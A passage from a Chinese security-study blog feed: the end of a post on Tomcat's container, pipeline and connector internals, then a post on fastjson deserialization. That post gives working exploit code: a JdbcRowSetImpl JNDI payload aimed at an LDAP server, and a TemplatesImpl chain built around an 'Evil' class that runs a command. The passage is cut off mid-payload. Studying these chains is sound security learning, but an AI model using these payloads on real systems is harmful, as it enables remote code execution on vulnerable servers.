alt="image-20240912110054380"></p><ol><li>描述符部署</li><li>war包部署</li><li>文件夹部署，就是将war解压的文件夹直接放到webapps下面，和war包部署没什么区别</li></ol><blockquote><p>源码中可以看到tomcat部署应用的时候是进行多线程部署的</p></blockquote><p><strong>描述符部署</strong></p><p>描述符部署用的是&lt;Context&gt;标签，比如我要布置上面的应用可以在server.xml这样配置</p><p><img src="https://cdn.clown2024.cn/202409121117862.png" alt="image-20240912111717790"></p><p>docBase就是应用的目录，到时候tomcat就会从该目录查找所需要的资源比如我们的class文件</p><h3 id="context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><p>Context的本质上就是一个容器，源码中就有一个叫做Context的接口</p><p><img src="https://cdn.clown2024.cn/202409121149984.png" alt="image-20240912114943927"></p><p>他继承自一个Container接口，我们可以去看看Container有哪些继承接口，里面就包含着tomcat的四大容器</p><h2 id="tomcat容器"><a href="#Tomcat容器" class="headerlink" title="Tomcat容器"></a>Tomcat容器</h2><p><img src="https://cdn.clown2024.cn/202409121151081.png" alt="image-20240912115147007"></p><p>tomcat的四大容器：</p><ul><li><p>Context：就是一个web应用程序，也就是我们前面配置的程序，配置在Host节点下面</p></li><li><p>Host：表示一个虚拟主机，一个虚拟主机下面可以有很多的应用</p><p><img src="https://cdn.clown2024.cn/202409121154456.png" alt="image-20240912115408390"></p><p>name就是主机名，appBase就是应用目录，也就是我们为什么要放在webapps下面</p></li><li><p>Engine：字面意思引擎，Host是Engine的子节点</p><p><img src="https://cdn.clown2024.cn/202409121157589.png" alt="image-20240912115730532"></p><p>在Engine里面，我们是可以定义多个虚拟主机，所以也就是我们可以将不同的应用放在不同的主机下，通过不同的主机名访问具体应用，不至于将所有应用放在localhost下面。</p></li><li><p>Wrapper：它实际上就封装着一个Servlet，负责管理整个Servlet的生命周期，包括装载、初始化、资源回收等。</p></li></ul><blockquote><p><img src="https://cdn.clown2024.cn/202409121216408.png" alt="image-20240912121655347"></p><p>我们正常会继承一个HttpServlet，所有访问这个Servlet的请求是共用一个Servlet实例也就是单例模式，但如果实现SingleThreadModel接口的话就是每个请求单独拥有一个实例</p></blockquote><p>整个容器的层级结构就如下：<br>Engine&#x3D;&#x3D;》Host&#x3D;&#x3D;》Context&#x3D;&#x3D;》Wrapper&#x3D;&#x3D;》Servlet</p><p>再讲讲为什么要多一个Wrapper，因为我们有时候会有多个Servlet实例，全放在Context下面会不好管理，所以就用Wrapper将Servlet实例按照类型管理起来，所以存储结构类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>List&lt;Host&gt;<br>Host:<br>List&lt;Context&gt;<br>Context<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servlet类<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><h3 id="pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><p>这里也可以看一下这篇文章：<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>pipeline翻译过来就是管道，每一个容易都有一个管道组件，pipeline里面又有valve阀门</p><p>所以上面的结构又可以优化成这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Host&gt;<br>Host:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Context&gt;<br>Context<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servlet类<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><p>我们的Request对象想要最终servlet里面的doGet等方法，会经过前面一系列的容器、管道、阀门。</p><p>每个管道最重要的是最后一个阀门，因为他要负责将request往下一个容器进行传递，所以最后一个阀门是tomcat提前写好的。</p><p><strong>Valve节点</strong></p><p>该节点配置在Host节点下面，可以配置经过该阀门时需要做什么，我们只需要去实现或继承valve相关的接口或类即可自己配置</p><p><img src="https://cdn.clown2024.cn/202409121354703.png" alt="image-20240912135432620"></p><p>比如下面的记录日志</p><p><img src="https://cdn.clown2024.cn/202409121200163.png" alt="image-20240912120035093"></p><h3 id="standardwrapper"><a href="#StandardWrapper" class="headerlink" title="StandardWrapper"></a>StandardWrapper</h3><p>这里我们去看一下Wrapper的pipeline的最后一个valve，因为他是直接和servlet接触的；</p><p>Wrapper的实现类是StandardWrapper</p><p><img src="https://cdn.clown2024.cn/202409121358782.png" alt="image-20240912135850663"></p><p>这个valve就是我们说的最后一个valve</p><p><img src="https://cdn.clown2024.cn/202409121400857.png" alt="image-20240912140039778"></p><p>具体的逻辑在StandardWrapperValve的invoke方法里面，可以看到这里接受了Request和Response</p><p>我们来看一下他里面一些关键的步骤</p><p><img src="https://cdn.clown2024.cn/202409121956314.png" alt="image-20240912195619220"></p><p>这里是分配servlet实例的地方，方法里的具体逻辑就不分析，知道他的作用就好</p><p><img src="https://cdn.clown2024.cn/202409121957566.png" alt="image-20240912195722497"></p><p>然后这里生成了一个filterchain，将我们的request、wrapper、servelt都封装了进去，这里的filterchain就是我们前面提到Filter</p><p><img src="https://cdn.clown2024.cn/202409122000325.png" alt="image-20240912200056244"></p><p>然后最终的操作就是在我们的doFilter里面进行，我们自己要建立Filter也是像写servlet一样，写一个类继承Filter相关的接口，然后在web.xml中配置，和要过滤的servlet对应起来</p><p><img src="https://cdn.clown2024.cn/202409122007925.png" alt="image-20240912200740837"></p><p>后面的调用流程就自己调一下源码看看就好了</p><h2 id="tomcat-connector"><a href="#Tomcat-Connector" class="headerlink" title="Tomcat Connector"></a>Tomcat Connector</h2><p>我们在前面的Tomcat架构图可以看到有Connector组件，tomcat有两个核心功能：</p><p>1.处理 Socket 连接，负责网络字节流与 Request 和 Response 对象的转化。</p><p>2.加载和管理 Servlet，以及具体处理 Request 请求。</p><p>我们的Container组件负责内部Servlet的管理和处理过来的Request请求，那外部传过来的数据是怎么生成Request对象的呢，这靠的就是Connector组件利用Socket接受操作系统传过来的数据，然后生成Request和Response对象。</p><p>在Tomcat中有一个Connector类可以去看看他的setProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409221831079.png" alt="image-20240922183030860"></p><p>他这里会根据选择不同的处理类，这个protocol就是我们server.xml那里配置的</p><p><img src="https://cdn.clown2024.cn/202409221835409.png" alt="image-20240922183544328"></p><p>然后HTTP1.1对应的两个处理类的区别如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">org.apache.coyote.http11.Http11AprProtocol ---BIO<br>org.apache.coyote.http11.Http11NioProtocol ---NIO<br></code></pre></td></tr></table></figure><p>那么这些类就是负责socket的连接管理和数据读取，我们可以进去看一下，这里看一下Http11NioProtocol的NIO读取数据</p><p><img src="https://cdn.clown2024.cn/202409222021606.png" alt="image-20240922202104507"></p><p>这里面new了一个NioEndpoint，这就是tomcat的一个连接器，用于处理网络连接，看一下他里面的方法</p><p><img src="https://cdn.clown2024.cn/202409222023442.png" alt="image-20240922202358352"></p><p>这里的Acceptor类是一个用于多线程执行任务的，因为AbstractEndpoint.Acceptor实现了Runnable接口，然后下面可以看到它accept了socket连接</p><p>那接受了socket之后就需要去处理这个socket连接，我们接着看</p><p><img src="https://cdn.clown2024.cn/202409222031639.png" alt="image-20240922203110543"></p><p>这里就会调用一个setSocketOptions来处理socket，如果返回false则关闭socket，我看视频里的版本他的是porcessSocket方法(可能是bio的方法)，我看了我的bio方法它使用的是<strong>processSocketWithOptions</strong>方法</p><p><img src="https://cdn.clown2024.cn/202409222045016.png" alt="image-20240922204517909"></p><p>nio还没学习看不太明白，但是最终就是在这里处理了，BIO就是使用线程池的方式来读取socket数据</p><p><img src="https://cdn.clown2024.cn/202409222049587.png" alt="image-20240922204936475"></p><p>这是bio的读取方式，然后继续往下跟就是一些数据解析然后构造Request对象，就不分析，有个大概概念就行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学内存马前就要来学一学java web三大件的相关原理：Servlet、Filter、Listener&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://www.cnblogs.com/jadite/p/16951328.html&quot;&gt;https://www.cnbl</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化</title>
    <link href="https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-23T17:35:44.000Z</published>
    <updated>2024-10-11T05:02:20.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson介绍"><a href="#fastjson介绍" class="headerlink" title="fastjson介绍"></a>fastjson介绍</h1><p>官方github地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p><p><strong>简单例子</strong></p><p>用Json的toJSONString方法将pojo类转换成字符串</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281554948.png" alt="image-20240828155427856"></p><p>这里的<strong>SerializerFeature.WriteClassName</strong>顾名思义就是指定序列化出来的字符串的格式，这里就是写出类名和键值对形式，更多的可以看源码尝试</p><p>JSON.parseObject将字符串转换回pojo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>        <span class="hljs-comment">//转变回pojo</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281555070.png" alt="image-20240828155545016"></p><p>这里注意要写全类名不然会报错</p><p>这里的<strong>Feature.SupportNonPublicField</strong>顾名思义也是还原的特点，这里是还原私有属性</p><p>然后我们注意到这里转换成pojo对象时会调用构造函数，其实还会调用他的set和get方法，所以fastjson的反序列化指的并不是java原生的反序列化，而是他json转化的过程。</p><p>将代码改一下看一下效果</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMap</span><span class="hljs-params">(String map)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setMap&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMap</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getMap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//这种方法会调用get和set方法</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;,\&quot;map\&quot;:\&quot;ceshi\&quot;&#125;&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">javaObject</span> <span class="hljs-operator">=</span> obj.toJavaObject(Student.class); <span class="hljs-comment">//只传一个参数只返回JSONObject类型，可以这样转换</span><br>        <span class="hljs-comment">//System.out.println(javaObject.getName() + &quot; &quot; + javaObject.getAge()+ &quot; &quot; + javaObject.getMap());</span><br>        System.out.println(<span class="hljs-string">&quot;------------------&quot;</span>);<br>        <span class="hljs-comment">//这种方法只调用set方法</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408282208338.png" alt="image-20240828220804265"></p><p>可以看到转换的时候会再一次调用set方法，而且注意这里的map属性我是没有定义的，但要是我的json字符串里有map属性也会调用对应的方法，不过对应的java对象get回来的属性值就为null</p><p>这里copy一下y4✌的总结：<a href="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md">https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md</a></p><ul><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法会被调用两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li></ul><blockquote><p>还有源码的调用分析不写了太臭太长了，看组长的视频已经要晕了，后面看链子的时候穿插着分析吧</p></blockquote><p>这里还有一张调用类的关系图</p><p><img src="https://cdn.clown2024.cn/202408282214028.png" alt="1"></p><blockquote><p>JSON：门面类，提供入口</p><p>DefaultJSONParser：主类</p><p>ParserConfig：配置相关类</p><p>JSONLexerBase：字符分析类</p><p>JavaBeanDeserializer：JavaBean反序列化类</p></blockquote><p>fastjson的利用的入口点就是对应的set或get方法的链子</p><h1 id="fastjson122-124-jndi"><a href="#Fastjson1-22-1-24-JNDI" class="headerlink" title="Fastjson1.22-1.24 JNDI"></a>Fastjson1.22-1.24 JNDI</h1><h2 id="基于jdbcrowsetimpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h2><p>他的触发点在**JdbcRowSetImpl#connect()**里面</p><p><img src="https://cdn.clown2024.cn/202408291556886.png" alt="image-20240829155500981"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/mQAZldWR\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408291630333.png" alt="image-20240829163040221"></p><blockquote><p>这里payload用parse或者parseObject都能触发</p><p>这里还学到了用yakit直接搭建JNDI服务器，特别方便</p><p><img src="https://cdn.clown2024.cn/202408291629022.png" alt="image-20240829162951907"></p><p>配置一下payload就能直接用了</p></blockquote><p>看一下利用链过程吧，这是从set方法打的，根据payload我们去看一下setAutoCommit方法，因为我们设置了autoCommit属性他就会走到这</p><p><img src="https://cdn.clown2024.cn/202408291726876.png" alt="image-20240829172622802"></p><p>这里conn一开始为空就会走到connect()方法</p><p><img src="https://cdn.clown2024.cn/202408291730922.png" alt="image-20240829173035857"></p><p><img src="https://cdn.clown2024.cn/202408291730868.png" alt="image-20240829173051811"></p><p>然后我们payload里面控制了一下dataSource属性值为恶意ldap服务器即可</p><p><strong>调试一下执行流程</strong></p><p>其实就是走一下前面没分析的反序列化的过程顺便调一下</p><p><img src="https://cdn.clown2024.cn/202408291632353.png" alt="image-20240829163154441"></p><p>因为要到toJSON方法才会调用get方法，前面直接到parse调用set方法触发更容易满足条件</p><p>一路跟进到这里</p><p><img src="https://cdn.clown2024.cn/202408291705004.png" alt="image-20240829170515929"></p><p>获取一个反序列化器，然后继续往里跟进</p><p><img src="https://cdn.clown2024.cn/202408291700828.png" alt="image-20240829170031726"></p><p>这里建立一个JavaBeanInfo类，里面就进行了对该类的各种字段和方法还有构造器的封装等，后面有链子需要利用到再详细说</p><p><img src="https://cdn.clown2024.cn/202408291649160.png" alt="image-20240829164912083"></p><p>然后继续跟进到执行lookup的地方</p><p><img src="https://cdn.clown2024.cn/202408291719865.png" alt="image-20240829171913782"></p><p>这里的getDataSourceName()我们可以控制</p><p><img src="https://cdn.clown2024.cn/202408291719522.png" alt="image-20240829171950465"></p><p>然后成功弹计算器。</p><p>不过jndi的打法有版本限制、依赖限制以及要出网</p><h1 id="fastjson122-124-templatesimpl"><a href="#Fastjson1-22-1-24-TemplatesImpl" class="headerlink" title="Fastjson1.22-1.24 TemplatesImpl"></a>Fastjson1.22-1.24 TemplatesImpl</h1><p><strong>限制</strong></p><p>该利用链需要设置<code>Feature.SupportNonPublicField</code>才能成功触发</p><p><strong>利用代码</strong></p><p>写一个恶意类继承<strong>AbstractTranslet</strong> </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Evil</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再写一个exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +<br>                    <span 